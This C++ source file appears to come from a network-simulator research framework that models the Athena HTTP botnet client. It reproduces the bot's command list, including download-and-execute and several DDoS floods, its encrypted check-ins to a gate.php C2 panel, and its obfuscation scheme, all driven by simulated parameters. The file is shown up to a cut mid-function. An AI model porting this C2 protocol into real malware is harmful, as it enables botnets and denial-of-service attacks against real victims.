//
// This program is free software: you can redistribute it and/or modify
// it under the terms of the GNU Lesser General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
// 
// This program is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
// GNU Lesser General Public License for more details.
// 
// You should have received a copy of the GNU Lesser General Public License
// along with this program.  If not, see http://www.gnu.org/licenses/.
// 

#include "AthenaBot.h"

namespace inet {

namespace simbo {

Define_Module(AthenaBot);

/**
 * Available Athena HTTP commands:
 * !download http://www.website.com/file.exe 1 - Downloads and executes a given file after a random number of seconds waited within a given range
 * !download.update http://www.website.com/file.exe 1 - Downloads and executes a given file after a random number of seconds waited within a given range, and then uninstalls
 * !download.arguments http://www.website.com/file.exe 1 arguments - Downloads and Executes a file with specified arguments
 * !download.abort http://www.website.com/file.exe 1 - Aborts a scheduled to download / update file -- this command is only available in the Athena IRC
 * !uninstall - Uninstalls
 * !ddos.stop - Ends any currently running DDoS
 * !ddos.http.rapidget http://www.website.com/ port duration_time - Sends mass amounts of randomized GET packets to a given target
 * All ddos (listed below) represent the same ddos.http.rapidget command:
 * !ddos.http.slowloris - Attacks a target webserver with many concurrent connections
 * !ddos.http.rudy - Slowly posts content by the masses to a target webserver
 * !ddos.http.rapidpost - Sends mass amounts of randomized POST packets to a given target
 * !ddos.http.slowpost – Holds many concurrent connections to a webserver through POST methods
 * !ddos.http.arme - Abuses partial content headers in order to harm a target webserver
 * !ddos.http.bandwith - This is a download based flood targetted torwards larger files and downloadable content on websites
 * !ddos.layer4.udp - Sends mass amounts of packets containing random data to a target host/ip
 * !ddos.layer4.ecf - Floods a target with rapid connections and disconnections (Previously named condis) (ECF stands for Established Connection Flooding)
 */

AthenaBot::OSMap AthenaBot::OS_map =
{
        {"Windows 2000", WINDOWS_2000},
        {"Windows XP", WINDOWS_XP},
        {"Windows 2003", WINDOWS_2003},
        {"Windows Vista", WINDOWS_VISTA},
        {"Windows 7", WINDOWS_7},
        {"Windows 8", WINDOWS_8},
        {"Linux", LINUX}
};

AthenaBot::AthenaBot()
{
    // New installation
    bNewInstallation = true;

    // DDoS not active
    bDdosBusy = false;

    // Default check-in
    nCheckInInterval = 60;

    // Return parameter
    cReturnParameter[0] = '0';
    cReturnParameter[1] = '\0';

    // Bot killer variables
    dwKilledProcesses = 0;
    dwFileChanges = 0;
    dwRegistryKeyChanges = 0;
}

AthenaBot::~AthenaBot()
{
    cancelEvent(uninstall);
    delete uninstall;
    cancelEvent(botMessage);
    delete botMessage;
}

void AthenaBot::initialize(int stage)
{
    EV_INFO << "Initializing Athena bot component, stage " << stage << endl;
    std::string hostName = "Host " + this->getIndex();
    //this->setName(hostName.c_str());
    GenericBot::initialize(stage);
    if (stage == INITSTAGE_LOCAL && infectedHost) {
        EV_INFO << "Initializing Athena bot component -- phase 1\n";
        double activationTime = par("botActivationTime");
        pingTime = par("botPingTime");
        EV_INFO << "Bot initial activation time is " << activationTime << endl;
        cServer = par("serverName").stringValue();

        // Event messages - download and execute, uninstall, ddos
        uninstall = new cMessage("Uninstall event message");
        uninstall->setKind(UNINSTALL_EVENT);

        // Host info
        isAdmin = par("admin").boolValue();
        is64Bits = par("x64").boolValue();
        isLaptop = par("laptop").boolValue();
        dotNetVersion = par("dotnet").stringValue();
        numCPUS = par("CPUs");
        std::string OS = par("OS").stdstringValue();
        paths = par("logPath").stdstringValue();
        dwOperatingSystem = OS_map.find(OS) != OS_map.end() ? OS_map[OS] : OS_map["WINDOWS_UNKNOWN"];

        // Message scheduling
        if (dwOperatingSystem != LINUX) {
            botMessage->setKind(MSGKIND_ACTIVITY_BOT_START);
            scheduleAt(simTime() + (simtime_t)activationTime, botMessage);
        }
        else
            infectedHost = false;
    }
}

void AthenaBot::handleMessage(cMessage *msg)
{
    if (msg->isSelfMessage()) {
        handleSelfMessages(msg);
    }
    else {
        EV_INFO << "Message received: " << msg->getName() << endl;
        EV_INFO << "received from: " << msg->getSenderModule()->getName() << endl;
        if (strcmp(msg->getSenderModule()->getName(), "tcpApp") == 0) {
            if (msg->getKind() == HOST_INFECTED) {
                if (dwOperatingSystem != LINUX) {
                    infectedHost = true;
                    botMessage->setKind(MSGKIND_ACTIVITY_BOT_START);
                    scheduleAt(simTime() + 1, botMessage);
                }
            }
            else if (msg->getKind() == HOST_NOT_INFECTED) {
                handleUninstall();
            }
        }
        else if (strcmp(msg->getSenderModule()->getName(), "DL&ExecModule"))
            handleDataMessage(msg);
        else {
            std::ostringstream stream;
            stream << "Bot response: " << commandsMap[dlExecLastMsgId];
            cMessage *responseMsg = new cMessage(stream.str().c_str());
            responseMsg->setKind(MSGKIND_BOT_RESPONSE_SESSION);
            scheduleAt(simTime() + (simtime_t) 1, responseMsg);
            delete msg;
        }
    }
}

void AthenaBot::handleDataMessage(cMessage *msg)
{
    httptools::HttpReplyMessage *appmsg = check_and_cast<httptools::HttpReplyMessage *>(msg);
    if (appmsg == nullptr)
        throw cRuntimeError("Message (%s)%s is not a valid reply message", msg->getClassName(), msg->getName());

    EV_INFO << "Message data: " << appmsg->payload() << endl;
    // Uninstall bot, if something happens to the server or the datamarker isn't correct
    if (!strstr(appmsg->heading(), "200 OK")) {
        infectedHost = false;
    }
    else if (!strstr(appmsg->payload(), cMarkerBase64)) {
        infectedHost = false;
    }
    else {
        const char *cMessageBundle = strstr(appmsg->payload(), cMarkerBase64) + strlen(cMarkerBase64);
        if (cMessageBundle == NULL)
            infectedHost = false;

        if (cMessageBundle[0] != '\0') {
            char cDecryptedMessageBundle[MAX_HTTP_PACKET_LENGTH];
            memset(cDecryptedMessageBundle, 0, sizeof(cDecryptedMessageBundle));
            DecryptReceivedData(cMessageBundle, cKeyA, cKeyB, cDecryptedMessageBundle);

            EV_INFO << "Message received from C2: " << cDecryptedMessageBundle;
            cMessageBundle = strtok(cDecryptedMessageBundle, "\n");
            while(cMessageBundle != NULL)
            {
                ParseHttpLine(cMessageBundle);

                if(bHttpRestart)
                    break;
                cMessageBundle = strtok(NULL, "\n");
            }
        }
    }
    if (bHttpRestart) {
        cancelEvent(botMessage);
        scheduleNextBotEvent(on_exec);
    }
    if (!infectedHost)
        scheduleAt(simTime() + (simtime_t) 1, uninstall);
    delete appmsg;
    return;
}

void AthenaBot::handleSelfMessages(cMessage *msg)
{
    switch (msg->getKind()) {
        case MSGKIND_ACTIVITY_BOT_START:
            handleSelfActivityBotStart();
            break;

        case MSGKIND_BOT_START_SESSION:
            handleSelfBotStartSession();
            break;

        case MSGKIND_BOT_REPEAT_SESSION:
            handleSelfBotRepeatSession();
            break;

        case MSGKIND_BOT_RESPONSE_SESSION:
            handleSelfBotResponseSession(msg);
            break;
        case DDOS_ACTIVATE_EVENT:
            handleActivateDDoS(msg);
            break;
        case DDOS_DESACTIVATE_EVENT:
            handleDesactivateDDoS();
            break;
        case UNINSTALL_EVENT:
            handleUninstall();
            break;
        case DL_EXEC_EVENT:
            handleDlExec(msg);
    }
}

void AthenaBot::handleSelfActivityBotStart()
{
    EV_INFO << "Starting new activity bot period @ T=" << simTime() << endl;

    // Bot configuration parameters
    if (botProtocol == http) {
        cModule *module = this->getParentModule()->getSubmodule("HTTPModule", 1);
        httpModule = check_and_cast<HTTPModule *>(module);
    }

    // HTTP GET Module - a simplified version of a Download Module
    if (par("downloadModule").stdstringValue().compare("yes") == 0) {
        cModule *module = addModule("DL&ExecModule", "inet.applications.simbo.Modulos.HTTPModule.HTTPModule");
        downloadModule = check_and_cast<HTTPModule *>(module);
        downloadModule->setName("DL&ExecModule");
    }

    // DDoS Module
    if (par("dosModule").stdstringValue().compare("yes") == 0) {
        cModule *module = addModule("DoSModule", "inet.applications.simbo.Modulos.DoSModule.DoSModule");
        dosModule = check_and_cast<DoSModule *>(module);
        dosModule->setName("DoSModule");
    }

    botMessage->setKind(MSGKIND_BOT_START_SESSION);
    scheduleAt(simTime() + (simtime_t) 1, botMessage);
}

void AthenaBot::handleSelfBotStartSession()
{
    EV_INFO << "Starting new bot session @ T=" << simTime() << endl;
    this->getDisplayString().setTagArg("i",1,"red");
    this->getParentModule()->getDisplayString().setTagArg("i",1,"red");
    int nextMsgType = ConnectToHttp();
    scheduleNextBotEvent(nextMsgType);
}

void AthenaBot::handleSelfBotRepeatSession()
{
    /*
    if (IsAdmin()) {
        EV_INFO << "Host " << this->getIndex() << "was restarted!";
        infectedHost = false;
        scheduleNextBotEvent(on_exec);
        return;
    }
    */
    EV_INFO << "Sending a repeat command to server @ T=" << simTime() << endl;
    int nextMsgType;

    char cDataToServer[MAX_HTTP_PACKET_LENGTH];
    memset(cDataToServer, 0, sizeof(cDataToServer));

    char cBusy[7];
    memset(cBusy, 0, sizeof(cBusy));
    bDdosBusy = false; // currently, IsAdmin() function act as head or tails
    if(bDdosBusy)
        strcpy(cBusy, "true");
    else
        strcpy(cBusy, "false");

    sprintf(cDataToServer, "|type:repeat|uid:%s|ram:%d|bk_killed:%i|bk_files:%i|bk_keys:%i|busy:%s|",
            cUuid, GetMemoryLoad(), dwKilledProcesses, dwFileChanges, dwRegistryKeyChanges, cBusy);

    char cHttpHost[MAX_PATH];
    memset(cHttpHost, 0, sizeof(cHttpHost));

    char cHttpPath[DEFAULT];
    memset(cHttpPath, 0, sizeof(cHttpPath));

    char cBreakUrl[strlen(cServer)];
    memset(cBreakUrl, 0, sizeof(cBreakUrl));
    strcpy(cBreakUrl, cServer);

    char *pcBreakUrl = cBreakUrl;

    if(strstr(pcBreakUrl, "http://"))
        pcBreakUrl += 7;
    else if(strstr(pcBreakUrl, "https://"))
        pcBreakUrl += 8;

    pcBreakUrl = strtok(pcBreakUrl, "/");
    if(pcBreakUrl != NULL)
        strcpy(cHttpHost, pcBreakUrl);

    pcBreakUrl = strtok(NULL, "?");
    if(pcBreakUrl != NULL)
        strcpy(cHttpPath, pcBreakUrl);

    strcpy(cHttpHostGlobal, cHttpHost);
    strcpy(cHttpPathGlobal, cHttpPath);
    if (!SendPanelRequest(cHttpHost, cHttpPath, usPort, cDataToServer))
        nextMsgType = repeat;
    else
        nextMsgType = on_exec;

    scheduleNextBotEvent(nextMsgType);
}

void AthenaBot::handleSelfBotResponseSession(cMessage *msg)
{
   char cDataToServer[MAX_HTTP_PACKET_LENGTH];
   memset(cDataToServer, 0, sizeof(cDataToServer));
   char msgName[200];
   strcpy(msgName, msg->getName());
   strtok(msgName, ":");
   int nLocalTaskId = atoi(strtok(NULL, ":"));

   char cBusy[7];
   memset(cBusy, 0, sizeof(cBusy));
   if(bDdosBusy)
       strcpy(cBusy, "true");
   else
       strcpy(cBusy, "false");

   sprintf(cDataToServer, "|type:response|uid:%s|taskid:%i|return:%s|busy:%s|", cUuid, nLocalTaskId, cReturnParameter, cBusy);

   char cHttpHost[MAX_PATH];
   memset(cHttpHost, 0, sizeof(cHttpHost));

   char cHttpPath[DEFAULT];
   memset(cHttpPath, 0, sizeof(cHttpPath));

   char cBreakUrl[strlen(cServer)];
   memset(cBreakUrl, 0, sizeof(cBreakUrl));
   strcpy(cBreakUrl, cServer);

   char *pcBreakUrl = cBreakUrl;

   if(strstr(pcBreakUrl, "http://"))
       pcBreakUrl += 7;
   else if(strstr(pcBreakUrl, "https://"))
       pcBreakUrl += 8;

   pcBreakUrl = strtok(pcBreakUrl, "/");
   if(pcBreakUrl != NULL)
       strcpy(cHttpHost, pcBreakUrl);

   pcBreakUrl = strtok(NULL, "?");
   if(pcBreakUrl != NULL)
       strcpy(cHttpPath, pcBreakUrl);

   strcpy(cHttpHostGlobal, cHttpHost);
   strcpy(cHttpPathGlobal, cHttpPath);
   SendPanelRequest(cHttpHost, cHttpPath, usPort, cDataToServer);
   delete msg;
}

void AthenaBot::handleDlExec(cMessage *msg)
{
    std::ostringstream stringStream;
    std::string url (urlDownload), header, body;
    stringStream << "GET /";
    if (fileDownload)
        stringStream << fileDownload;
    stringStream << " HTTP/1.1";
    header = stringStream.str();
    downloadModule->sendRequestToServer(this, url, header, body);
    dlExecLastMsgId = msg->getId();

    bGlobalOnlyOutputMd5Hash = false;
    bMd5MustMatch = false;
    bExecutionArguments = false;
    bDownloadAbort = false;
    bUpdate = false;
    memset(szMd5Match, 0, sizeof(szMd5Match));
    delete msg;
}

void AthenaBot::handleActivateDDoS(cMessage *msg)
{
    std::string target (urlTarget);
    if (target.find("http://") != std::string::npos)
        target = target.substr(target.find("http://") + 7);
    else if (target.find("https://") != std::string::npos)
        target = target.substr(target.find("https://") + 8);
    dosModule->activateModule(target);
    currentDdos = new cMessage("DDoS Desactivate Event");
    currentDdos->setKind(DDOS_DESACTIVATE_EVENT);
    scheduleAt(simTime() + (simtime_t) dwStoreParameter, currentDdos);
    bDdosBusy = true;
    std::ostringstream stream;
    stream << "Bot response: " << commandsMap[msg->getId()];
    cMessage *responseMsg = new cMessage(stream.str().c_str());
    responseMsg->setKind(MSGKIND_BOT_RESPONSE_SESSION);
    scheduleAt(simTime() + (simtime_t) 10, responseMsg);
    delete msg;
}

void AthenaBot::handleDesactivateDDoS()
{
    dosModule->desactivateModule();
    bDdosBusy = false;
}

void AthenaBot::handleUninstall()
{
    EV_INFO << "Uninstalling bot from " << this->getName() << endl;
    infectedHost = false;
    cancelEvent(botMessage);
    this->getDisplayString().setTagArg("i",1,"white");
    this->getParentModule()->getDisplayString().setTagArg("i",1,"white");
}

void AthenaBot::scheduleNextBotEvent(int msgType)
{
    EV_INFO << "Scheduling new bot message @ T=" << simTime() << endl;
    EV_INFO << "Message type: ";
    switch (msgType) {
    case on_exec: EV_INFO << "on_exec" << endl; botMessage->setKind(MSGKIND_BOT_START_SESSION); break;
    case repeat: EV_INFO << "repeat" << endl; botMessage->setKind(MSGKIND_BOT_REPEAT_SESSION); break;
    case response: EV_INFO << "response" << endl; botMessage->setKind(MSGKIND_BOT_RESPONSE_SESSION); break;
    default: EV_ERROR << "Type not defined" << endl;
    }
    scheduleAt(simTime() + (simtime_t) nCheckInInterval, botMessage);
}

int AthenaBot::ConnectToHttp()
{
    RunThroughUuidProcedure();

    // <!-------! CRC AREA START !-------!>
    if(!bConfigSetupCheckpointSeven)
        usPort = GetRandNum(100) + 1;
    // <!-------! CRC AREA STOP !-------!>

    // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>
    time_t tTime;
    struct tm *ptmTime;
    tTime = time(NULL);
    ptmTime = localtime(&tTime);
    char cTodaysDate[20];
    memset(cTodaysDate, 0, sizeof(cTodaysDate));
    strftime(cTodaysDate, 20, "%y%m%d", ptmTime);
    if(atoi(cTodaysDate) >= nExpirationDateMedian)
        //break;
        // <!-------! TRICKY UNFAIR STUFF - BUT ANTICRACK INDEED !-------!>

        bHttpRestart = false;

    char cPrivelages[6];
    if(IsAdmin())
        strcpy(cPrivelages, "admin");
    else
        strcpy(cPrivelages, "user");

    char cBits[3];
    if (Is64Bits())
        strcpy(cBits, "64");
    else
        strcpy(cBits, "86");

    char cComputerGender[8];
    if(IsLaptop())
        strcpy(cComputerGender, "laptop");
    else
        strcpy(cComputerGender, "desktop");

    char cDataToServer[MAX_HTTP_PACKET_LENGTH];

    memset(cDataToServer, 0, sizeof(cDataToServer));
    cVersion[0] = '0';
    cVersion[1] = '\0';

    sprintf(cDataToServer, "|type:on_exec|uid:%s|priv:%s|arch:x%s|gend:%s|cores:%i|os:%s|ver:%s|net:%s|new:",
            cUuid, cPrivelages, cBits, cComputerGender, GetNumCPUs(), GetOs(), cVersion, GetVersionMicrosoftDotNetVersion());

    if(bNewInstallation)
        strcat(cDataToServer, "1");
    else
        strcat(cDataToServer, "0");

    strcat(cDataToServer, "|");

    char cHttpHost[MAX_PATH];
    memset(cHttpHost, 0, sizeof(cHttpHost));

    char cHttpPath[DEFAULT];
    memset(cHttpPath, 0, sizeof(cHttpPath));

    char cBreakUrl[strlen(cServer)];
    memset(cBreakUrl, 0, sizeof(cBreakUrl));
    strcpy(cBreakUrl, cServer);

    char *pcBreakUrl = cBreakUrl;

    if(strstr(pcBreakUrl, "http://"))
        pcBreakUrl += 7;
    else if(strstr(pcBreakUrl, "https://"))
        pcBreakUrl += 8;

    pcBreakUrl = strtok(pcBreakUrl, "/");
    if(pcBreakUrl != NULL)
        strcpy(cHttpHost, pcBreakUrl);

    pcBreakUrl = strtok(NULL, "?");
    if(pcBreakUrl != NULL)
        strcpy(cHttpPath, pcBreakUrl);

    strcpy(cHttpHostGlobal, cHttpHost);
    strcpy(cHttpPathGlobal, cHttpPath);

    if(SendPanelRequest(cHttpHost, cHttpPath, usPort, cDataToServer))
        return on_exec;

    return repeat;
}

/**
 * WinAPI functions
 */
void AthenaBot::fncUuidCreate(UUID *uuid)
{
    unsigned long f8 = 4294967295;
    unsigned short f4 = 65535;
    unsigned short f2 = 255;
    std::default_random_engine generator(simTime().dbl());
    std::uniform_int_distribution<unsigned long> distribution_long(0, f8);
    std::uniform_int_distribution<unsigned short> distribution_short(0, f4);
    std::uniform_int_distribution<unsigned short> distribution_char(0, f2);

    uuid->Data1 = distribution_long(generator);
    uuid->Data2 = distribution_short(generator);
    uuid->Data3 = distribution_short(generator);
    for (int i = 0; i < 8; ++i)
        uuid->Data4[i] = distribution_char(generator);
}

void AthenaBot::fncUuidToString(UUID *uuid, char *uuidString)
{
    sprintf(uuidString, "%lX-%hX-%hX-%hhX%hhX-%hhX%hhX%hhX%hhX%hhX%hhX", uuid->Data1, uuid->Data2, uuid->Data3,
            uuid->Data4[0], uuid->Data4[1], uuid->Data4[2], uuid->Data4[3], uuid->Data4[4],
            uuid->Data4[5], uuid->Data4[6], uuid->Data4[7]);
}

void AthenaBot::fncRpcStringFree(char *str)
{
    free(str);
}

/**
 * Utilities/ProcessStrings.cpp
 */
void AthenaBot::StripDashes(char *pcString)
{
    DWORD dwOffset = 0;

    for(unsigned short us = 0; us < strlen(pcString); us++)
    {
        if(pcString[us] == '-')
        {
            dwOffset++;
            pcString[us] = pcString[us + dwOffset];
        }
    }
}

char *AthenaBot::StripReturns(char *pcString)
{
    for(unsigned short us = 0; us < strlen(pcString); us++)
    {
        if(pcString[us] == '\r' || pcString[us] == '\n')
            pcString[us] = '\0';
    }
    return pcString;
}

/**
 * Utilities/ComputerInfo.cpp
 */
unsigned int AthenaBot::GetMemoryLoad()
{
    std::default_random_engine generator(simTime().dbl());
    std::uniform_int_distribution<DWORD> distribution (0, 100);
    unsigned int dwLoad = distribution(generator);
    return dwLoad;
}

const char *AthenaBot::GetVersionMicrosoftDotNetVersion()
{
    return dotNetVersion;
}

bool AthenaBot::IsAdmin() //Determines if the executable is running as user or admin
{
    return isAdmin;
}

bool AthenaBot::Is64Bits()
{
    return is64Bits;
}

bool AthenaBot::IsLaptop()
{
    return isLaptop;
}

unsigned int AthenaBot::GetNumCPUs() //Determines the number of processors on the host computer
{
    return numCPUS;
}

char *AthenaBot::SimpleDynamicXor(char *pcString, DWORD dwKey)
{
    for(unsigned short us = 0; us < strlen(pcString); us++)
        pcString[us] = (pcString[us] ^ dwKey);

    // <!-------! CRC AREA START !-------!>
    bConfigSetupCheckpointFive = true;
    // <!-------! CRC AREA STOP !-------!>

    return pcString;
}

/**
 * Hub/HttpUtilities.cpp
 */
bool AthenaBot::SendPanelRequest(char *cHttpHost, char *cHttpPath, unsigned short usHttpPort, char *cHttpData)
{
    bool bReturn = false;

    char cEncryptedData[MAX_HTTP_PACKET_LENGTH];
    memset(cEncryptedData, 0, sizeof(cEncryptedData));
    char cEncryptedKey[MAX_HTTP_PACKET_LENGTH];
    memset(cEncryptedKey, 0, sizeof(cEncryptedKey));
    memset(cKeyA, 0, sizeof(cKeyA));
    memset(cKeyB, 0, sizeof(cKeyB));
    EncryptSentData(cHttpData, cEncryptedData, cEncryptedKey, cKeyA, cKeyB);

    char cOutPacket[MAX_HTTP_PACKET_LENGTH];
    memset(cOutPacket, 0, sizeof(cOutPacket));

    cReturnNewline[0] = '\r';
    cReturnNewline[1] = '\n';
    cReturnNewline[2] = '\0';
    strcpy(cOutPacket, "POST /gate.php");
    strcat(cOutPacket, cHttpPath);
    strcat(cOutPacket, " HTTP/1.1");
    strcat(cOutPacket, cReturnNewline);

    strcat(cOutPacket, "Host: ");
    strcat(cOutPacket, cHttpHost);
    strcat(cOutPacket, ":");
    char cHttpPort[7];
    memset(cHttpPort, 0, sizeof(cHttpPort));
    //itoa(usHttpPort, cHttpPort, 10);
    sprintf(cHttpPort, "%d", usHttpPort);
    strcat(cOutPacket, cHttpPort);
    //strcat(cOutPacket, "192.168.56.102");
    strcat(cOutPacket, cReturnNewline);

    strcat(cOutPacket, "Connection: close");
    strcat(cOutPacket, cReturnNewline);

    strcat(cOutPacket, "Content-Type: application/x-www-form-urlencoded");
    strcat(cOutPacket, cReturnNewline);

    strcat(cOutPacket, "Cache-Control: no-cache");
    strcat(cOutPacket, cReturnNewline);

    /* Currently, no 'User-Agent' string on the request
    if(dwOperatingSystem > WINDOWS_XP)
    {
        char cObtainedUserAgentString[MAX_HTTP_PACKET_LENGTH];
        memset(cObtainedUserAgentString, 0, sizeof(cObtainedUserAgentString));
        DWORD dwUserAgentLength;
        if(fncObtainUserAgentString(0, cObtainedUserAgentString, &dwUserAgentLength) == NOERROR)
        {
            strcat(cOutPacket, "User-Agent: ");
            strcat(cOutPacket, cObtainedUserAgentString);
            strcat(cOutPacket, cReturnNewline);
        }
    }
    */

    char cFinalOutData[strlen(cEncryptedData) * 3];
    memset(cFinalOutData, 0, sizeof(cFinalOutData));
    StringToStrongUrlEncodedString(cEncryptedData, cFinalOutData);

    char cFinalOutKey[strlen(cEncryptedKey) * 3];
    memset(cFinalOutKey, 0, sizeof(cFinalOutKey));
    StringToStrongUrlEncodedString(cEncryptedKey, cFinalOutKey);

    memset(cMarker, 0, sizeof(cMarker));
    memset(cMarkerBase64, 0, sizeof(cMarkerBase64));
    GenerateMarker(cMarker, cMarkerBase64);

    char cUrlEncodedMarker[strlen(cMarker) * 3];
    memset(cUrlEncodedMarker, 0, sizeof(cUrlEncodedMarker));
    StringToStrongUrlEncodedString(cMarker, cUrlEncodedMarker);

    strcat(cOutPacket, "Content-Length: ");
    char cHttpContentLength[25];
    memset(cHttpContentLength, 0, sizeof(cHttpContentLength));
    int nPacketDataLength = 2 + strlen(cFinalOutKey) + 3 + strlen(cFinalOutData) + 3 + strlen(cUrlEncodedMarker);
    sprintf(cHttpContentLength, "%d", nPacketDataLength);
    strcat(cOutPacket, cHttpContentLength);
    strcat(cOutPacket, cReturnNewline);
    strcat(cOutPacket, cReturnNewline);

    char cPacketData[nPacketDataLength];
    memset(cPacketData, 0, sizeof(cPacketData));
    strcpy(cPacketData, "a=");
    strcat(cPacketData, cFinalOutKey);
    strcat(cPacketData, "&b=");
    strcat(cPacketData, cFinalOutData);
    strcat(cPacketData, "&c=");
    strcat(cPacketData, cUrlEncodedMarker);
    strcat(cPacketData, "\n");

    EV_INFO << "----------------------\nOutgoing Packet(" << strlen(cOutPacket) << " bytes):\n" << cOutPacket << std::endl;
    EV_INFO << "-----------\nDecrypted Contents(" << strlen(cHttpData) << " bytes): " << cHttpData << std::endl;

    httpModule->sendRequestToServer(this, cHttpHost, cOutPacket, cPacketData);

    return bReturn;
}
void AthenaBot::EncryptSentData(char *cSource, char *cOutputData, char *cOutputEncryptedKey, char *cOutputRawKeyA, char *cOutputRawKeyB)
{
    srand(GenerateRandomSeed());

    char cKeyA[KEY_SIZE];
    memset(cKeyA, 0, sizeof(cKeyA));
    char cKeyB[KEY_SIZE];
    memset(cKeyB, 0, sizeof(cKeyB));
    GeneratestrtrKey(cKeyA, cKeyB);
    char cKey[KEY_SIZE * 2];
    memset(cKey, 0, sizeof(cKey));
    sprintf(cKey, "%s:%s", cKeyA, cKeyB);
    char cKeyEncryptedA[strlen(cKey) * 3];
    memset(cKeyEncryptedA, 0, sizeof(cKeyEncryptedA));
    base64_encode((unsigned char*)cKey, strlen(cKey), cKeyEncryptedA, sizeof(cKeyEncryptedA));
    char cKeyEncryptedB[strlen(cKeyEncryptedA) * 3];
    memset(cKeyEncryptedB, 0, sizeof(cKeyEncryptedB));
    StringToStrongUrlEncodedString(cKeyEncryptedA, cKeyEncryptedB);
    char cEncryptedA[strlen(cSource) * 3];
    memset(cEncryptedA, 0, sizeof(cEncryptedA));
    base64_encode((unsigned char*)cSource, strlen(cSource), cEncryptedA, sizeof(cEncryptedA));
    char cEncryptedB[strlen(cEncryptedA)];
    memset(cEncryptedB, 0, sizeof(cEncryptedB));
    strcpy(cEncryptedB, cEncryptedA);
    strtr(cEncryptedB, cKeyA, cKeyB);
    strcpy(cOutputData, cEncryptedB);
    strcpy(cOutputEncryptedKey, cKeyEncryptedB);
    strcpy(cOutputRawKeyA, cKeyA);
    strcpy(cOutputRawKeyB, cKeyB);

    EV_INFO << "----------------------\nEncryption Communication Details:\nKey: " << cKey << "\nKey StrongUrlEncoded: " << cKeyEncryptedB << "\nData Encrypted(strtr): " << cEncryptedB << std::endl;
}

int AthenaBot::GeneratestrtrKey(char *cOutputA, char *cOutputB)
{
    if(KEY_SIZE % 2 == 0)
        return 0;

    bool bSwitched = false;

    char cKeyA[KEY_SIZE];
    memset(cKeyA, 0, sizeof(cKeyA));

    char cKeyB[KEY_SIZE];
    memset(cKeyB, 0, sizeof(cKeyB));

    while(true)
    {
        unsigned short us = GetRandNum(26) + 97;

        char cChar[2];
        memset(cChar, 0, sizeof(cChar));
        cChar[0] = (char)us;

        if(!bSwitched)
        {
            if(strstr(cKeyA, cChar))
                continue;
            else
                strcat(cKeyA, cChar);
        }
        else
        {
            if(!strstr(cKeyA, cChar) || strstr(cKeyB, cChar))
                continue;
            else
                strcat(cKeyB, cChar);
        }

        if((strlen(cKeyA) == (KEY_SIZE - 1) / 2) && !bSwitched)
            bSwitched = true;
        else if(strlen(cKeyB) == (KEY_SIZE - 1) / 2)
            break;
    }

    int nCombinedLength = strlen(cKeyA) + strlen(cKeyB);

    strcpy(cOutputA, cKeyA);
    strcpy(cOutputB, cKeyB);

    return nCombinedLength;
}

void AthenaBot::StringToStrongUrlEncodedString(char *cSource, char *cOutput)
{
    char cUrlEncoded[strlen(cSource) * 3];
    memset(cUrlEncoded, 0, sizeof(cUrlEncoded));

    for(unsigned int ui = 0; ui < strlen(cSource); ui++)
    {
        char cHex[4];
        memset(cHex, 0, sizeof(cHex));
        sprintf(cHex, "%%%X", (unsigned int)cSource[ui]);

        strcat(cUrlEncoded, cHex);
    }

    strcpy(cOutput, cUrlEncoded);
}

void AthenaBot::GenerateMarker(char *cOutput, char *cOutputBase64)
{
    char cMarker[26];
    memset(cMarker, 0, sizeof(cMarker));

    for(unsigned short us = 0; us < 3; us++)
        strcat(cMarker, GenRandLCText());

    char cBase64[strlen(cMarker) * 3];
    memset(cBase64, 0, sizeof(cBase64));
    base64_encode((unsigned char*)cMarker, strlen(cMarker), cBase64, sizeof(cBase64));

    strcpy(cOutput, cMarker);
    strcpy(cOutputBase64, cBase64);
}

void AthenaBot::DecryptReceivedData(const char *cSource, char *cKeyA, char *cKeyB, char *cOutputData)
{
    char cDecryptedA[strlen(cSource)];
    memset(cDecryptedA, 0, sizeof(cDecryptedA));
    strcpy(cDecryptedA, cSource);
    strtr(cDecryptedA, cKeyB, cKeyA);

    char cDecryptedB[strlen(cDecryptedA)];
    memset(cDecryptedB, 0, sizeof(cDecryptedB));
    base64_decode(cDecryptedA, cDecryptedB, sizeof(cDecryptedB));

    strcpy(cOutputData, cDecryptedB);
}

void AthenaBot::ParseHttpLine(const char *cMessage)
{
    char cDecrypted[MAX_HTTP_PACKET_LENGTH];
    memset(cDecrypted, 0, sizeof(cDecrypted));
    base64_decode(cMessage, cDecrypted, sizeof(cDecrypted));

    char cRawMessage[MAX_HTTP_PACKET_LENGTH];
    memset(cRawMessage, 0, sizeof(cRawMessage));
    strcpy(cRawMessage, cDecrypted);

    char cParseLine[MAX_HTTP_PACKET_LENGTH];
    memset(cParseLine, 0, sizeof(cParseLine));

    EV_INFO << "Message decrypted and decoded: " << cRawMessage << endl;
    if(strstr(cRawMessage, "interval")) {
        memcpy(cParseLine, cRawMessage + 10, strlen(cRawMessage) - 10 - 1);

        if(atoi(cParseLine) < 5)
            nCheckInInterval = 5;
        else
            nCheckInInterval = atoi(cParseLine);
    }
    else if(strstr(cRawMessage, "taskid") && strstr(cRawMessage, "command")) {
        unsigned short usCommandOffsetForTaskId = 0;

        unsigned short usLocationInMessageOffset = strlen(cRawMessage) - strlen(strstr(cRawMessage, "command"));
        memcpy(cParseLine, cRawMessage + usLocationInMessageOffset + 8, strlen(cRawMessage) - usLocationInMessageOffset - 8 - 1);
        if(cParseLine[0] == '!') {
            usCommandOffsetForTaskId = strlen(cParseLine);
            memcpy(cParseLine, cParseLine + 1, strlen(cParseLine)); //cParseLine == THE COMMAND
        }
        char cTaskId[10];
        memset(cTaskId, 0, sizeof(cTaskId));
        memcpy(cTaskId, cRawMessage + 8, strlen(cRawMessage) - 8 - usCommandOffsetForTaskId - 2);

        int nTaskId = atoi(cTaskId); //nTaskId == THE TASK ID
        nCurrentTaskId = nTaskId;

        char cFinalCommand[DEFAULT];
        memset(cFinalCommand, 0, sizeof(cFinalCommand));
        strcpy(cFinalCommand, cParseLine);
        EV_INFO << "ParseHttpLine: " << cFinalCommand;
        char *regex = strtok(cFinalCommand, " ");
        regex = strtok(NULL, " ");
        std::ifstream paths_ (paths);
        int counter = 0;
        int max = getParentModule()->getIndex();
        if (paths_.is_open()) {
            std::string path;
            while (counter <= max) {
                while (getline(paths_, path)) {
                    counter++;
                    if (counter > max) {
                        DIR *dir;
                        struct dirent *ent;
                        if ((dir = opendir (path.c_str())) != NULL) {
